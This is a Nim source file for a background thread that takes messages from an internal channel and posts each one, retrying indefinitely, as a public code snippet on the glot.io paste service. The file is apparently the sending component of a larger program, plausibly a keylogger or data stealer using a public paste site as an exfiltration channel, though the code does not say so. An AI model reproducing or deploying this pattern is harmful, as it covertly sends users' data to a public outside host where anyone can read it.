from puppy import Request
from puppy import Response
from puppy import parseUrl
from puppy import Header
from puppy import fetch

from os import sleep

from ../channels import sendThreadChannel
from ../flags import SEND_THREAD_TRY_INTERVAL

proc send(data: string): void =
  let req: Request = Request(
    url: parseUrl("https://snippets.glot.io/snippets"),
    verb: "POST",
    headers: @[Header(key: "Content-Type", value: "application/json")],
    body: "{\"public\": true, \"language\": \"cpp\", \"title\": \"ceva\", \"files\": [{\"name\": \"name\", \"content\": \"" &
        data & "\"}]}"
  )

  let res: Response = fetch(req)

  echo res.code

proc initSendThread*(): void {.thread.} =

  while true:
    let (dataAvaliable, msg) = sendThreadChannel.tryRecv()

    if dataAvaliable:
      var worked: bool = false

      while not worked:
        try:
          send msg

          worked = true
        except:
          sleep SEND_THREAD_TRY_INTERVAL

    sleep 10

  close sendThreadChannel
